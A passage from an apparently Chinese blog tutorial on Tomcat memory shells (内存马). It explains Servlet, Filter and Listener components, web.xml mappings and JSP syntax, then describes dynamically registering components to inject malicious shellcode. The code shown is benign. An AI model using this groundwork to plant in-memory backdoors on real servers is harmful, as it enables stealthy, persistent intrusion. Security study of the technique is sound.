class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> response.getWriter();<br><br>        <span class="hljs-comment">// printWriter.write(&quot;&lt;pre&gt;&lt;h3&gt;&quot;);</span><br>        printWriter.write(message);<br>        <span class="hljs-comment">// 放行请求</span><br>        chain.doFilter(request,response);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>web.xml</strong></p>
<p>我们在配置url-pattern配置时，有三种写法：</p>
<ul>
<li>精确匹配：&#x2F;Login</li>
<li>目录匹配：&#x2F;aaa&#x2F;bbb&#x2F;*</li>
<li>扩展名匹配：*.abc，*.jsp</li>
</ul>
<p><strong>值得注意的是</strong>，url-pattern也可以使用servlet-name代替，此时Filter会与Servlet绑定。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--/src/main/webapp/WEB-INF/web.xml--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">web-app</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--这里是给我们的servlet取个别名，一般类名就行--&gt;</span>a<br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--这里是全类名，也就是让系统知道你上面那个名字是取给谁的--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>example.demo.Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>arg1<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>Servlet_login<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--给上面的东西添加映射，可以理解为，上面创建了一个门，这里写门通向哪里--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--和上面的大门名对应--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--大门名的接口, 后面运行后的地址加上/ser01，就可以访问到我们的servlet类了--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Login<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br>  <span class="hljs-comment">&lt;!--  配置ServletContext上下文参数--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>arg2<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>ServletContext<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>Filter1<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>example.demo.Filter_memshell<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>Filter1<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--对该web应用下的所有资源进行过滤--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>Filter2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>example.demo.Filter_2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>Filter2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--&lt;servlet-name&gt;Login&lt;/servlet-name&gt;--&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>当然，对于注册Filter，我们也可以使用<code>@WebFilter()</code>注解实现，上述web.xml可以简写为：</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@WebFilter(filterName = <span class="hljs-string">&quot;Filter_memshell&quot;</span>,</span><br><span class="hljs-meta">    urlPatterns = <span class="hljs-string">&quot;/Login&quot;</span></span><br><span class="hljs-meta">)</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/08f8d96e4dc04d108fd5bf4dcbecea7a.png" srcset="/img/loading.gif" lazyload alt="image-20221124155447634"></p>
<h5 id="Filter执行顺序"><a href="#Filter执行顺序" class="headerlink" title="Filter执行顺序"></a>Filter执行顺序</h5><p>filter执行顺序是由filter注册时优先级决定，与Servlert类似，Filter也存在两种注册方式。</p>
<ul>
<li>基于注解配置：按照类名的字符串比较规则比较，值小的先执行</li>
<li>基于web.xml配置：根据对应的Mapping的顺序组织，定义在上面先执行。</li>
</ul>
<h5 id="FilterConfig"><a href="#FilterConfig" class="headerlink" title="FilterConfig"></a>FilterConfig</h5><p>与Servlet类似，Filte同样存在FilterConfig存储基本配置信息，不同的是Filer只能在<code>init</code>方法参数中获取。</p>
<p><strong>主要方法</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getFilterName</span><span class="hljs-params">()</span></span>  获得Filter的名字<span class="hljs-attribute">filter</span>-name的内容<br><span class="hljs-function"><span class="hljs-title">getServletContext</span><span class="hljs-params">()</span></span> 获得ServletContext对象<br><span class="hljs-function"><span class="hljs-title">getInitParameter</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>)</span></span> 获取在Filter中配置的init-param初始化参数<br><span class="hljs-function"><span class="hljs-title">getInitParameterNames</span><span class="hljs-params">()</span></span> 获取在Filter中配置的初始化参数的名称<br></code></pre></td></tr></table></figure>

<h4 id="Listener组件"><a href="#Listener组件" class="headerlink" title="Listener组件"></a>Listener组件</h4><p>Listener是Listener监听器，用于监听一个方法或属性，当被监听的方法被调用或者属性改变时，通过回调函数，反馈给客户（程序）。</p>
<h5 id="监听器的分类"><a href="#监听器的分类" class="headerlink" title="监听器的分类"></a>监听器的分类</h5><table>
<thead>
<tr>
<th align="center">事件源</th>
<th align="center">监听器</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ServletContext</td>
<td align="center">ServletContextListener</td>
<td>用于监听 ServletContext 对象的创建与销毁过程</td>
</tr>
<tr>
<td align="center">HttpSession</td>
<td align="center">HttpSessionListener</td>
<td>用于监听 HttpSession 对象的创建和销毁过程</td>
</tr>
<tr>
<td align="center">ServletRequest</td>
<td align="center">ServletRequestListener</td>
<td>用于监听 ServletRequest 对象的创建和销毁过程</td>
</tr>
<tr>
<td align="center">ServletContext</td>
<td align="center">ServletContextAttributeListener</td>
<td>用于监听 ServletContext 对象的属性新增、移除和替换</td>
</tr>
<tr>
<td align="center">HttpSession</td>
<td align="center">HttpSessionAttributeListener</td>
<td>用于监听 HttpSession 对象的属性新增、移除和替换</td>
</tr>
<tr>
<td align="center">ServletRequest</td>
<td align="center">ServletRequestAttributeListener</td>
<td>用于监听 HttpServletRequest 对象的属性新增、移除和替换</td>
</tr>
<tr>
<td align="center">HttpSession</td>
<td align="center">HttpSessionBindingListener</td>
<td>用于监听 JavaBean 对象绑定到 HttpSession 对象和从 HttpSession 对象解绑的事件</td>
</tr>
<tr>
<td align="center">HttpSession</td>
<td align="center">HttpSessionActivationListener</td>
<td>用于监听 HttpSession 中对象活化和钝化的过程</td>
</tr>
</tbody></table>
<p>根据监听对象的不同可以划分为三类：</p>
<ul>
<li>ServletContextListener：服务器启动和终止时触发</li>
<li>HttpSessionListener：有关Session操作时触发</li>
<li>ServletRequestListener：访问服务时触发</li>
</ul>
<h5 id="ServletContextListener使用示例"><a href="#ServletContextListener使用示例" class="headerlink" title="ServletContextListener使用示例"></a>ServletContextListener使用示例</h5><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">// src/main/java/Listener_memshell.java</span><br><span class="hljs-keyword">package</span> example.demo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> javax.servlet.<span class="hljs-keyword">annotation</span>.*;<br><br><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Listener_memshell</span> <span class="hljs-title">implements</span> <span class="hljs-title">ServletContextListener</span>, <span class="hljs-type">HttpSessionListener</span>, <span class="hljs-type">HttpSessionAttributeListener</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> void contextInitialized(ServletContextEvent sce) &#123;<br>        <span class="hljs-comment">/* This method is called when the servlet context is initialized(when the Web application is deployed). */</span><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;ServletContext对象创建了！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> void contextDestroyed(ServletContextEvent sce) &#123;<br>        <span class="hljs-comment">/* This method is called when the servlet Context is undeployed or Application Server shuts down. */</span><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;ServletContext对象销毁了！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>当启动Tomcat时，Servlet被创建；Tomcat结束时，Servlet被销毁。</p>
<p><img src="https://img-blog.csdnimg.cn/d598838334fe42478756fafc44d07d11.png" srcset="/img/loading.gif" lazyload alt="image-20221124163335188"></p>
<p><img src="https://img-blog.csdnimg.cn/fce0a000e60f4ab681d83704e6272828.png" srcset="/img/loading.gif" lazyload alt="image-20221124163345152"></p>
<h4 id="三个组件启动顺序"><a href="#三个组件启动顺序" class="headerlink" title="三个组件启动顺序"></a>三个组件启动顺序</h4><p>tomcat启动时，三大组件的启动顺序为<code>Listener-&gt;Filter-&gt;Servlet</code>，在<code>org.apache.catalina.core.StandardContext</code>类的<code>startInternal()</code>方法中，依次调用了<code>listenerStart()</code>，<code>filterStart()</code>，<code>loadOnStartUp()</code>分别对应Listener，Filter，Servlet。</p>
<p><img src="https://img-blog.csdnimg.cn/71508e147e2c4c3b93609a4bfe26be10.png" srcset="/img/loading.gif" lazyload alt="image-20221124164252406"></p>
<h3 id="参考连接-1"><a href="#参考连接-1" class="headerlink" title="参考连接"></a>参考连接</h3><p><a target="_blank" rel="noopener" href="https://www.lmlphp.com/user/454/article/item/14301/">tomcat整体架构</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_65725031/article/details/125313204">Tomcat 主要组件(让你熟练运用)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8075b390a58a">javaweb三大组件</a></p>
<p><a target="_blank" rel="noopener" href="http://t.zoukankan.com/tag6254-p-9407156.html">JavaEE–JavaWeb三大组件Servlet、Filter、Listener</a></p>
<h2 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h2><p>在介绍Tomcat内存马之前，我们首先介绍一下jsp的语法，因为Tomcat是默认支持jsp语言的，而我们的内存马也是通过jsp脚本注入的。</p>
<h3 id="JSP入门"><a href="#JSP入门" class="headerlink" title="JSP入门"></a>JSP入门</h3><h4 id="JSP实现原理及简单语法"><a href="#JSP实现原理及简单语法" class="headerlink" title="JSP实现原理及简单语法"></a>JSP实现原理及简单语法</h4><p>tomcat内置jsp的一个servlet，会将<code>*.jsp</code>转换为java代码，从而编译为<code>.class</code>文件运行，同时jsp也可以获取到服务器的网络请求并作出相应的响应。</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsp"><span class="hljs-comment">// 普通脚本</span><br>&lt;% java代码 %&gt;<br><br><span class="hljs-comment">// 普通脚本可以使用所有的java语法，除了定义函数，脚本之间不可嵌套，脚本与html之间不可嵌套。</span><br><br>&lt;%<br>	out.println(<span class="hljs-string">&quot;hi&quot;</span>);<br>	System.out.println(<span class="hljs-string">&quot;hi&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">// 声明脚本</span><br>&lt;%! 定义变量、函数%&gt;<br><span class="hljs-comment">// 声明脚本声明的变量都是全局变量</span><br><span class="hljs-comment">// 声明脚本的内容必须在普通脚本中调用</span><br><span class="hljs-comment">// 如果声明脚本中的函数具有返回值，使用输出脚本调用</span><br><br>&lt;%!<br>	<span class="hljs-built_in">int</span> a = <span class="hljs-number">0</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func</span>()</span>&#123;<br>		System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;hi&quot;</span>);<br>	&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">输出脚本<br>&lt;<span class="hljs-meta">%</span>=java表达式<span class="hljs-meta">%</span>&gt;<br>输出脚本可以输出带有返回值的函数，输出脚本不能加分号<br><br>&lt;<span class="hljs-meta">%</span>=<span class="hljs-string">&quot;hello world&quot;</span><span class="hljs-meta">%</span>&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">注释<br>&lt;%-- --%&gt;	不会发送到浏览器<br><span class="hljs-comment">&lt;!-- --&gt;</span>	会发送到浏览器<br></code></pre></td></tr></table></figure>

<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mel">jsp指令，用来设置于整个jsp页面相关的属性，共有三个，如下<br>&lt;%@ page ...%&gt;	定义页面的依赖属性，比如脚本语言、<span class="hljs-keyword">error</span>页面<br>&lt;%@ include ...%&gt;	包含其他文件<br>&lt;%@ taglib ...%&gt;	引入标签库的定义，可以是自定义标签<br><br>page指令语法格式<br>&lt;%@ page attr1=<span class="hljs-string">&quot;value1&quot;</span> attr2=<span class="hljs-string">&quot;value2&quot;</span>%&gt;	<br>include指令语法格式<br>&lt;%@ include <span class="hljs-keyword">file</span>=<span class="hljs-string">&quot;file_path&quot;</span>%&gt;	静态包含<br>taglib指令<br>&lt;%@ taglib uri=<span class="hljs-string">&quot;外部标签库路径&quot;</span> prefix=<span class="hljs-string">&quot;前缀&quot;</span>%&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs routeros">动作标签<br>语法&lt;jsp:action_name <span class="hljs-attribute">attr</span>=<span class="hljs-string">&quot;value&quot;</span> /&gt;<br>动作标签指jsp页面在运行期间的命令<br><br>1.include<br>语法：&lt;jsp:include <span class="hljs-attribute">page</span>=<span class="hljs-string">&quot;相对url地址&quot;</span> /&gt;<br>&lt;jsp:include&gt;动作元素会将外部文件输出结果包含在jsp中，动态包含<br><br>2.useBean<br>语法：&lt;jsp:useBean <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;对象名字&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;package.className&quot;</span> /&gt;<br>jsp:useBean动作用来加载一个将在jsp页面中使用的javabean<br><br>3. setProperty<br>设置属性值<br><br>4.getProperty<br>取属性值<br><br>示例<br>&lt;jsp:useBean <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.qf.entity.User&quot;</span> /&gt;<br>&lt;jsp:setProperty <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attribute">property</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;tom&quot;</span> /&gt;<br>&lt;jsp:getProperty <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attribute">property</span>=<span class="hljs-string">&quot;username&quot;</span> /&gt;<br><br>5.forward<br>语法：&lt;jsp:forward <span class="hljs-attribute">page</span>=<span class="hljs-string">&quot;相对url地址&quot;</span>&gt;<br>将请求转向另外的页面<br><br>6.param<br>语法：&lt;jsp:param <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;<br>在转发动作内部使用，做参数传递<br></code></pre></td></tr></table></figure>

<h4 id="JSP内置对象、四大域对象"><a href="#JSP内置对象、四大域对象" class="headerlink" title="JSP内置对象、四大域对象"></a>JSP内置对象、四大域对象</h4><p><strong>JSP内置对象</strong></p>
<p>由jsp自动创建的对象，可以直接使用，共有9个</p>
<p>request、response、session、application、config、exception、out、pageContext、page</p>
<p><strong>四大域对象</strong></p>
<p>jsp由四大作用域对象，存储数据和获取数据的方式一样，不同的是取值的范围有差别</p>
<blockquote>
<p>pageContext	当前jsp页面范围，一旦跳转则失效。用于获取其他8个内置对象</p>
<p>request	一次请求有效</p>
<p>session	一次会话有效（关闭浏览器失效）</p>
<p>application	整个web应用有效（服务器重启或关闭失效）</p>
</blockquote>
<p>pageContext还可以操作其他作用域，向其他作用域存值和取值</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>        pageContext.setAttribute(<span class="hljs-string">&quot;page&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        pageContext.setAttribute(<span class="hljs-string">&quot;req&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, PageContext.REQUEST_SCOPE);<br>        pageContext.setAttribute(<span class="hljs-string">&quot;sess&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, PageContext.SESSION_SCOPE);<br>        pageContext.setAttribute(<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, PageContext.APPLICATION_SCOPE);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (String) pageContext.getAttribute(<span class="hljs-string">&quot;req&quot;</span>, PageContext.REQUEST_SCOPE);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">sess</span> <span class="hljs-operator">=</span> (String) pageContext.getAttribute(<span class="hljs-string">&quot;sess&quot;</span>, PageContext.SESSION_SCOPE);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> (String) pageContext.getAttribute(<span class="hljs-string">&quot;app&quot;</span>, PageContext.APPLICATION_SCOPE);<br>    %&gt;<br></code></pre></td></tr></table></figure>

<h3 id="JavaWeb-基本流程"><a href="#JavaWeb-基本流程" class="headerlink" title="JavaWeb 基本流程"></a>JavaWeb 基本流程</h3><p>​		与php内存马不同的是，Java内存马并不是死循环创建文件的笨办法，但很类似，首先我们先来了解一下JavaWeb的基本组件。通常运行Java的web容器是tomcat，这里以tomcat为例，客户端与服务器(tomcat)交互流程如图所示：</p>
<p><img src="https://img-blog.csdnimg.cn/5cd2320cf9074c16b264bf39aaf9ba1b.png" srcset="/img/loading.gif" lazyload alt="image-20221117191625498"></p>
<p>​		客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，我们只要在这个请求中做手脚，在内存中修改已有的组件或者<strong>动态注册</strong>一个新的组件，插入恶意的shellcode，就可以达到我们的目的。<strong>动态注册</strong>技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态注册添加内存马的方式适合Tomcat7.x以上版本。</p>
<p>按照shellcode的具体位置，就有</p>
<ul>
<li>listener内存马</li>
<li>filter内存马</li>
<li>Servlet内存马</li>
</ul>
<p><strong>maven配置文件</strong></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code 